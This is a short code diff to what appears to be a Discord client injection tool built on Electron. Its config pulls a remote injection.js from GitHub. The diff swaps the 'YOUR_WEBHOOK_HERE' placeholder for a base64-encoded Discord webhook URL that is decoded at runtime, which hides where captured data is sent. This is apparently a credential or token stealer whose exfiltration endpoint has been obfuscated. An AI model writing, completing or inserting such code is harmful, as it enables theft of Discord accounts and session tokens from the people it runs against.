@@ -10,9 +10,10 @@ const {
     session,
     app
 } = require('electron');
+const encodedHook = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI0OTk4MTc3MjMxODYzODEzNC90dUhuc1dsdGppQnBZaUV6MGlzNWdEcjBNSjh2SklpZjE2bXdfOWF5eHZyNThyYWxzTExpczJyODNHMUFCdnNJMlZhRQ=='
 
 const CONFIG = {
-    webhook: "YOUR_WEBHOOK_HERE",
+    webhook: atob(encodedHook),
     injection_url: "https://raw.githubusercontent.com/adasdasdsaf/discord-injection/main/injection.js",
     filters: {
         urls: [
